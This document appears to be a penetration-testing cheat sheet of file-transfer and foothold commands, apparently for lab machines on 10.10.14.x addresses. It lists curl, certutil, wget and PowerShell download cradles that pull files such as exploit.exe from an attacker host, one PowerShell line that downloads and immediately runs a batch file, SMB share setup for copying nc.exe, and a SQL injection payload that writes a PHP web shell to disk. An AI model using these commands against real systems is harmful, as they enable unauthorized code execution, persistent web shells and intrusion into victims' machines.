# Curl
~~~
curl http://10.10.14.3/exploit.exe -o "C:\users\tim\exploit.exe"
~~~
~~~
curl <target>/<uploadDir>/ --upload-file <Upload File>
~~~
~~~
curl -O http://10.10.14.3<FileName>
~~~
~~~
iwr -uri 10.10.14.3/<Filename> -Outfile <Output-location>
~~~
~~~
certutil -urlcache -f http://10.10.14.3/<filename> <after filename>
~~~
~~~
python3 -m http.server 80
~~~
~~~
python -m SimpleHTTPServer 80
~~~
~~~
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<your-ip>:<your-port>/<DownloadFile-Name>','<Convert-Name>')”
~~~
~~~
powershell -c "Invoke-WebRequest 'http://10.10.15.3:12345/aaa.bat' -OutFile 'c:\Users\Public\Downloads\aaa.bat';c:\Users\Public\Downloads\aaa.bat"
~~~
~~~
xfreerdp3 /v:<Traget-IP> /u:<Username> /p:<Password> /drive:<Tragetdir>,<Mountpoint>
~~~
~~~
‘ UNION SELECT '<?php system($_REQUEST["cmd"]); ?>' INTO OUTFILE "</Directory>/<Filename>.php"-- -
~~~
~~~
wget -P <OutputLocation> "http://10.10.14.3/<Filename> > <After-Filename>"
~~~
~~~
scp <username>@<target>:<FilePath> <StrageLocation>
~~~
~~~
impacket-smbserver -username kali -password kali -ip 10.10.14.3 -port 445 share /home/kali/<path> -smb2support
~~~
~~~
"net use \\<IP>\<ShareName> /user:<user> <pass>
copy ./<file> \\<IP>\share
copy \\<IP>\share\nc.exe"
~~~
~~~
~~~
~~~
~~~
~~~
~~~
